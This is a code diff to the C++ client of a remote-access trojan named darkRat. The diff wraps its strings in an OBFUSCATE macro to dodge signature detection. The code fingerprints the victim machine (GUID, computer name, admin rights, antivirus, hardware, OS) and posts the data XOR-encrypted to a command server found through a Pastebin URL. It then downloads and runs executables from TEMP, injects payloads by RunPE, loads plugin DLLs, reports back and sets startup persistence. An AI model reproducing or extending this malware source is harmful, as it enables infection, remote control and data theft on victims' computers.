@@ -37,10 +37,24 @@ public:
 
 
 	static std::string returnFinalPost(darkRat::config::config config) {
-		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
-		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
-		std::string net35 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5"));
-		std::string net4 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4"));
+		std::string key2 = OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
+		std::string key3 = OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
+		std::string key35 = OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
+		std::string key4 = OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
+
+
+		std::string hwid = OBFUSCATE("hwid=");
+		std::string computername = OBFUSCATE("&computername=");
+		std::string aornot = OBFUSCATE("&aornot=");
+		std::string installedRam = OBFUSCATE("&installedRam=");
+		std::string netFramework2 = OBFUSCATE("&netFramework2=");
+		std::string netFramework3 = OBFUSCATE("&netFramework3=");
+
+
+		std::string net2 = Helpers::checkIfRegKeyExists(key2);
+		std::string net3 = Helpers::checkIfRegKeyExists(key3);
+		std::string net35 = Helpers::checkIfRegKeyExists(key35);
+		std::string net4 = Helpers::checkIfRegKeyExists(key4);
 
 		std::string cpuName = base64_encode((const unsigned char*)OsHelpers::getCpuName().c_str(), OsHelpers::getCpuName().length());
 		std::string prcessorArchitecture = base64_encode((const unsigned char*)OsHelpers::PrcessorArchitecture().c_str(), OsHelpers::PrcessorArchitecture().length());
@@ -48,23 +62,26 @@ public:
 		std::string av = base64_encode((const unsigned char*)Helpers::getCurrentAv().c_str(), Helpers::getCurrentAv().length());
 		std::string winver = base64_encode((const unsigned char*)Helpers::GetWindowsVersionString().c_str(), Helpers::GetWindowsVersionString().length());
 
+
+
+
 		std::string args = 
-			"hwid=" + Helpers::GetMachineGUID() +
-			"&computername=" + Helpers::getComputerName() +
-			"&aornot=" + OsHelpers::checkPEIsAdmin() +
-			"&installedRam=" + OsHelpers::getRam() +
-			"&netFramework2=" + net2 +
-			"&netFramework3=" + net3 +
-			"&netFramework35=" + net35 +
-			"&netFramework4=" + net4 +
-			"&antivirus=" + av +
-			"&botversion=" +config.versionID +
-			"&gpuName=" + gpuName +
-			"&cpuName=" + cpuName +
-			"&arch=" + prcessorArchitecture +
-			"&operingsystem=" + winver +
-			"&spreadtag=" + config.spreadtag;
-		std::string finalPost = "request=" + XOR::encryptReqeust(args);
+			hwid + Helpers::GetMachineGUID() +
+			computername + Helpers::getComputerName() +
+			aornot + OsHelpers::checkPEIsAdmin() +
+			installedRam + OsHelpers::getRam() +
+			netFramework2 + net2 +
+			netFramework3 + net3 +
+			OBFUSCATE("&netFramework35=") + net35 +
+			OBFUSCATE("&netFramework4=") + net4 +
+			OBFUSCATE("&antivirus=") + av +
+			OBFUSCATE("&botversion=") +config.versionID +
+			OBFUSCATE("&gpuName=") + gpuName +
+			OBFUSCATE("&cpuName=") + cpuName +
+			OBFUSCATE("&arch=") + prcessorArchitecture +
+			OBFUSCATE("&operingsystem=") + winver +
+			OBFUSCATE("&spreadtag=") + config.spreadtag;
+		std::string finalPost = OBFUSCATE("request=") + XOR::encryptReqeust(args);
 		
 		return finalPost;
 	}
@@ -75,10 +92,10 @@ public:
 		std::thread runningPlugin;
 		std::string gateFromPatebin;
 		if (config.pastebinUrl.find(OBFUSCATE("http://")) != std::string::npos) {
-			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", OBFUSCATE("GET")));
 		}
 		else if (config.pastebinUrl.find(OBFUSCATE("https://")) != std::string::npos) {
-			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", OBFUSCATE("GET")));
 		}
 		else {
 			gateFromPatebin = XOR::Decrypt(config.pastebinUrl);
@@ -99,9 +116,12 @@ public:
 			}
 		}
 
+
+		std::string post =  OBFUSCATE("POST");
+
 		while (true) {
 			try {
-				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST", config.useragent);
+				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, post.c_str(), config.useragent);
 				std::cout << responseFromGate;
 				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -110,7 +130,7 @@ public:
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
 					Helpers::downloadFile(url, file);
 					std::string started = Helpers::startNewProcess(file);
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
+					postRequest(gateFromPatebin, OBFUSCATE("hwid=") + guid + OBFUSCATE("&taskstatus=") + started + OBFUSCATE("&taskid=") + v[0], post.c_str(), config.useragent);
 				}
 				else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -125,10 +145,10 @@ public:
 					if (runned) {
 						started = OBFUSCATE("injected");
 					}
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
+					postRequest(gateFromPatebin, OBFUSCATE("hwid=") + guid + OBFUSCATE("&taskstatus=") + started + OBFUSCATE("&taskid=") + v[0], post.c_str(), config.useragent);
 				}
 				else if (responseFromGate.find(OBFUSCATE("runplugin")) != std::string::npos) {
-					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+					std::vector<std::string> v = Helpers::explode(OBFUSCATE(";"), responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
 					std::string url(v[2]);
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
@@ -152,7 +172,7 @@ public:
 					catch (...) {
 
 					}
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
+					postRequest(gateFromPatebin, OBFUSCATE("hwid=") + guid + OBFUSCATE("&taskstatus=") + started + OBFUSCATE("&taskid=") + v[0], post.c_str(), config.useragent);
 
 				}
 				else {
@@ -174,7 +194,7 @@ public:
 						if (config.startup == "true") {
 							startupPersistence.detach();
 						}
-						Helpers::killProcessByName(OBFUSCATE("wscript.exe"));
+				
 					}
 				}
 			}
